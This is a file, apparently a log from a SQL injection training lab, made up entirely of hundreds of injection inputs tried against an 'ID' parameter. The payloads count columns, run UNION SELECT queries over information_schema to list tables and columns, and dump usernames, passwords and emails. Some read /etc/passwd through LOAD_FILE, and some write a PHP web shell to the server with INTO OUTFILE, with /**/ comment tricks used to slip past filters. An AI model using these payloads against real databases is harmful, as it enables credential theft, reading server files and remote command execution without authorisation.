@@ -1,0 +1,380 @@
+ID:1
+ID:1
+ID:1'
+ID:1' 
+ID:1' order by 1 
+ID:1' order by 2 
+ID:1' order by 3 
+ID:1' #
+ID:1' order by 1#
+ID:1' order by 2#
+ID:1' order by 3#
+ID:1' order by 1-- 
+ID:1' order by 2-- 
+ID:1' order by 3-- 
+ID:1')-- 
+ID:1') order by 1-- 
+ID:1') order by 2-- 
+ID:1') order by 3-- 
+ID:1') order by 4-- 
+ID:1') order by 4
+ID:1") order by 4
+ID:1" order by 4
+ID:1' order by 4
+ID:1'-- 
+ID:1' order by 1-- 
+ID:1' order by 2-- 
+ID:1' order by 3-- 
+ID:1') order by 3-- 
+ID:1' order by 3-- 
+ID:1" order by 3-- 
+ID:1') order by 3-- 
+ID:1') order by 3
+ID:1 order by 3
+ID:1 order by 3-- 
+ID:1 order by 4-- 
+ID:1 order by 4-- 
+ID:1' order by 4-- 
+ID:1' order by 3-- 
+ID:1' order by 4-- 
+ID:1
+ID:1'
+ID:1' --
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4--
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 --
+ID:1' order by 4 
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1'
+ID:1' -- 
+ID:1' --
+ID:1' 
+ID:1' #
+ID:1' order by 1#
+ID:1' order by 2#
+ID:1' order by 3#
+ID:1' order by 4#
+ID:1' or 1=1 union select 1,2,3#
+ID:1' or 1=1 union select 1,2,3#
+ID:1' union select 1,2,3#
+ID:1' and 1=2union select 1,2,3#
+ID:1' and 1=2 union select 1,2,3#
+ID:1' and 1=2 union select 1,database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,group_concat(table_name) from information_schema.schemata where schema_name=database(),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_names) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_schema) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),user()#
+ID:1' and 1=2 union select 1,(select group_concat(id,username,password) from users),user()#
+ID:1' and 1=2 union select 1,(select group_concat(id,username,password) from users),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.schemata where schema_name=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where schema_name=database()),user()
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()
+ID:1' and 1=2 union select 1,(select group_concat(table_name)，3 from information_schema.tables where table_schema=database()),user()
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()
+ID:1'
+ID:1'
+ID:1'
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()
+ID:1'
+ID:1' 
+ID:1' #
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#
+ID:1' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),user()#
+ID:1'
+ID:1' -- 
+ID:1' order by 5 -- 
+ID:1'
+ID:1
+ID:1'
+ID:1' and '1'='1' -- 
+ID:1' and '1'='2' -- 
+ID:1' order by 3 -- 
+ID:1' order by 2 -- 
+ID:1' order by 1 -- 
+ID:1' order by 1 and '1'='1-- 
+ID:1' order by 2 and '1'='1-- 
+ID:1' order by 3 and '1'='1-- 
+ID:1' order by 4 and '1'='1-- 
+ID:1' order by 4 and '1'='1-- 
+ID:1'
+ID:1' -- 
+ID:1' order by 1-- 
+ID:1' order by 3-- 
+ID:1' order by 3-- 
+ID:1' order by 4-- 
+ID:1' union select 1,2,3-- 
+ID:1' and 1=2 union select 1,2,3-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>",2,3 into outfile "shell.php"-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>","<? system($_request['cmd']);?>",3 into outfile "shell.php"-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>","<? system($_request['cmd']);?>",3 into outfile "shellthree.php"-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>","<? system($_request['cmd']);?>",3 into outfile "../shellthree.php"-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>","<? system($_request['cmd']);?>",3 into outfile "wamp\www\shell.php"-- 
+ID:1' and 1=2 union select "<? system($_request['cmd']);?>","<? system($_request['cmd']);?>",3 into outfile "www\shell.php"-- 
+ID:1'
+ID:1' --
+ID:1' -- 
+ID:1' and 1=1-- 
+ID:1' and 1=2-- 
+ID:1'union all select 1,2,3-- 
+ID:1' union all select 1,2,3-- 
+ID:1' and 1=2 union all select 1,2,3-- 
+ID:1' and 1=2 union all select 1,LOAD_FILE("etc/passwd"),3-- 
+ID:1' and 1=2 union all select 1,LOAD_FILE("/etc/passwd"),3-- 
+ID:1' and 1=2 union all select 1,LOAD_FILE("shell.php"),3-- 
+ID:1' and 1=2 union all select 1,LOAD_FILE('shell.php'),3-- 
+ID:1
+ID:1'
+ID:1' -- 
+ID:1' and 1=2-- 
+ID:1' and 1=1-- 
+ID:1' and 1=1 order by 3 -- 
+ID:1' and 1=1 order by 4 -- 
+ID:1' and 1=1 order by 3 -- 
+ID:1' and 1=2 union select 1,2,3-- 
+ID:1
+ID:2
+ID:3
+ID:4
+ID:4'
+ID:4' --
+ID:4' -- 
+ID:4' and '1'='1-- 
+ID:4' and '1'='1'-- 
+ID:4'
+ID:4' and 1=2
+ID:4' and 1=2-- 
+ID:4' and 1=1 -- 
+ID:4' or 1=1 -- 
+ID:4' and 1=1 order by 1 -- 
+ID:4' and 1=1 order by 2 -- 
+ID:4' and 1=1 order by 3 -- 
+ID:4' and 1=1 order by 4 -- 
+ID:4' and 1=1 order by 3 -- 
+ID:4' and 1=1 order by 4 -- 
+ID:4' and 1=2 union select 1,2,3-- 
+ID:4' and 1=2 union select 1,2,3-- 
+ID:4' and 1=2 union select 1,2,3-- 
+ID:4' and 1=2 union select 1,2,3 -- 
+ID:4
+ID:4' and 1=2 union select 1,2,3 -- 
+ID:4' and 1=2 union select 1,'abc',3 -- 
+ID:4' and 1=2 union select 1,database(),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users'),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,username,password) from users),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,username,password) from database().users),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,username,password) from security.users),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,username,password) from security.users),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,-,username,-,password) from security.users),3 -- 
+ID:4' and 1=2 union select 1,(select group_concat(id,'-',username,'-',password) from security.users),3 -- 
+ID:1
+ID:2
+ID:3
+ID:1
+ID:2
+ID:2"
+ID:2'
+ID:2' and '1'='1
+ID:2' and '1'='2
+ID:2' and '1'='1
+ID:1' and '1'='1
+ID:1' and '1'='2
+ID:1' and '1'='1
+ID:1' and '1'='2
+ID:1' and '1'='1
+ID:1' and '1'='2
+ID:1' and '1'='1
+ID:2' and '1'='1
+ID:2' and '1'='2
+ID:2' and '1'='1
+ID:2' and '1'='2
+ID:2' and '1'='1
+ID:2' and '1'='2
+ID:2' and 0 and '1'='2
+ID:2' and 0 order by 1and '1'='2
+ID:2' and 0 order by 1and '1'='2
+ID:2' and 0 order by 1 and '1'='2
+ID:2' and 0 order by 2 and '1'='2
+ID:2' and 0 order by 3\ and '1'='2
+ID:2' and 0 order by 3 and '1'='2
+ID:2' and 0 order by 4 and '1'='2
+ID:2'
+ID:2' and 1 order by 1and '1'='1
+ID:2' and 1 order by 1 and '1'='1
+ID:2' and 1 order by  1 and '1'='1
+ID:2' and 1 order by 2 and '1'='1
+ID:2' and 1 order by 3 and '1'='1
+ID:2' and 1 order by 4 and '1'='1
+ID:2' and 1 order by  and '1'='1 -- 
+ID:2' and 1 order by  1and '1'='1 -- 
+ID:2' and 1 order by -- 
+ID:2'
+ID:2' -- 
+ID:2' -- 
+ID:1' -- 
+ID:2' -- 
+ID:3' -- 
+ID:3'
+ID:3' and '1'='1
+ID:3' order by 4 and '1'='1
+ID:3' order by 3 and '1'='1
+ID:3'
+ID:3' and '1'='1
+ID:3' -- 
+ID:3' and 1=1-- 
+ID:3' and 1=2-- 
+ID:3' and 1=1-- 
+ID:3' and 1=1 order by 1-- 
+ID:3' and 1=1 order by 2-- 
+ID:3' and 1=1 order by 3-- 
+ID:3' and 1=1 order by 4-- 
+ID:3' and 1=1 order by 4--
+ID:3' and 1=1 order by 4--
+ID:3' and 1=1 order by 4 -- 
+ID:3' and 1=1 order by 4 --
+ID:3' and 1=1 order by 4 -- 
+ID:3' and 1=1 order by 3 -- 
+ID:3' order by 3 --
+ID:3' order by 3 -- 
+ID:3-- 
+ID:3 -- 
+ID:3 -- 
+ID:3‘’ -- 
+ID:3' -- 
+ID:3 -- 
+ID:3' -- 
+ID:3-- 
+ID:3' order by 1-- 
+ID:3' order by 2-- 
+ID:3' order by 3-- 
+ID:3' order by 4-- 
+ID:3' and 1=2-- 
+ID:3' and 1=2 union select 1,2,3-- 
+ID:3' and 1=1 union select 1,2,3-- 
+ID:3' and 1=1 union select 1,2,3 -- 
+ID:3' and 1=1 union select 1,2,3 -- 
+ID:3' and 1=1 union select 1,2,3 -- 
+ID:3' and 1=1 union select 1,2,3 -- 
+ID:3' and 1=2 union select 1,2,3 -- 
+ID:3' and 1=2 union select 1,'hi',3 -- 
+ID:3' and 1=2 union select 1,database(),3 -- 
+ID:3' and 1=2 union select 1,database(),user() -- 
+ID:3' and 1=2 union select 1,database(),database() -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(schema_name) from information_schema.schemata where schema=database()) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(schema_name) from information_schema.schemata) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where schemata=database()) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema='security') -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users') -- 
+ID:3' and 1=2 union select 1,database(),(select group_concat(id,username,password) from users) -- 
+ID:1
+ID:1/**/union/**/select/**/1
+ID:1/**/union/**/select/**/1
+ID:1/**/union/**/select/**/1,2,3
+ID:1/**/union/**/select/**/1,2,3 -- 
+ID:1/**/union/**/select/**/1,2,3   
+ID:1
+ID:1/**/union/**/select/**/1,2,3
+ID:1'/**/union/**/select/**/1,2,3
+ID:1'/**/union/**/select/**/1,2,3'
+ID:1'/**/union/**/select/**/1,2,3,4'
+ID:1'/**/union/**/select/**/1,2,1'
+ID:100'/**/union/**/select/**/1,2,1'
+ID:1’/**/union/**/select/**/1
+ID:1’/**/union/**/select/**/1,2
+ID:1’/**/union/**/select/**/1,2,3,4
+ID:1’/**/and/**/1=2/**/union/**/select/**/1,2,3,4
+ID:1’/**/and/**/1=2/**/union/**/select/**/1,2,3
+ID:1
+ID:1'
+ID:1/**/union/**/select/**/1
+ID:1/**/union/**/select/**/1,2
+ID:1/**/union/**/select/**/1,2,3
+ID:1/**/union/ **/select/**/1,2,3/**/from/**/account
+ID:1/**/union/**/select/**/1,2,3/**/from/**/user
+ID:1/**/union/ **/select/**/1,2,3/**/from/**/account
+ID:1/**/union/ **/select/**/1,2,3/**/from/**/accounts
+ID:1/**/union/**/select/**/1,2,3/**/from/**/users
+ID:1/**/union/**/select/**/1,2,3/**/from/**/user
+ID:1/**/union/**/select/**/1,2,3/**/from/**/count
+ID:1/**/union/**/select/**/id,2,3/**/from/**/user
+ID:1/**/union/**/select/**/id,2,3/**/from/**/users
+ID:1/**/union/**/select/**/id,names,3/**/from/**/users
+ID:1000/**/union/**/select/**/id,names,3/**/from/**/users
+ID:1000/**/union/**/select/**/id,name,3/**/from/**/users
+ID:1000/**/union/**/select/**/id,useername,3/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,3/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,user()/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,group_concat(username),password/**/from/**/users
+ID:1000/**/union/**/select/**/id,group_concat(username),group_concat(password)/**/from/**/users
+ID:1
+ID:1'
+ID:1 union select 1,2,3
+ID:1 union select 1,2
+ID:1/**/union/**/select 1,2
+ID:1/**/union/**/select/**/1,2,3
+ID:1/**/union/**/select/**/1,2,3/**/from/**/user
+ID:1/**/union/**/select/**/1,2,3/**/from/**/users
+ID:1/**/union/**/select/**/id,2,3/**/from/**/users
+ID:1/**/union/**/select/**/id,user,3/**/from/**/users
+ID:1/**/union/**/select/**/id,username,3/**/from/**/users
+ID:1/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1/**/union/**/select/**/id,username,password1/**/from/**/users
+ID:1/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users/**/union/**/select/**/id,username,password/**/from/**/ users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users/**/union/**/select/**/1,id,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,username,password/**/from/**/users
+ID:1000/**/union/**/select/**/id,group_concat(username),group_concat(password)/**/from/**/users
+ID:1000/**/union/**/select/**/id,group_concat(username),group_concat(password)/**/from/**/admin
+ID:1000/**/union/**/select/**/id,group_concat(username),group_concat(password)/**/from/**/emails
+ID:1000/**/union/**/select/**/id,group_concat(email),group_concat(password)/**/from/**/emails
+ID:1000/**/union/**/select/**/id,group_concat(emails),group_concat(password)/**/from/**/emails
+ID:1000/**/union/**/select/**/id,group_concat(email_id),group_concat(password)/**/from/**/emails
+ID:1000/**/union/**/select/**/id,group_concat(email_id)/**/from/**/emails
+ID:1/**/union/**/select/**/id,group_concat(email_id)/**/from/**/emails
+ID:1 and 1=2/**/union/**/select/**/id,group_concat(email_id)/**/from/**/emails
+ID:1/**/and/**/1=2/**/union/**/select/**/id,group_concat(email_id)/**/from/**/emails
+ID:1/**/and/**/1=2/**/union/**/select/**/id,group_concat(email_id),3/**/from/**/emails
+ID:1
+ID:100
+ID:10
+ID:3
+ID:3
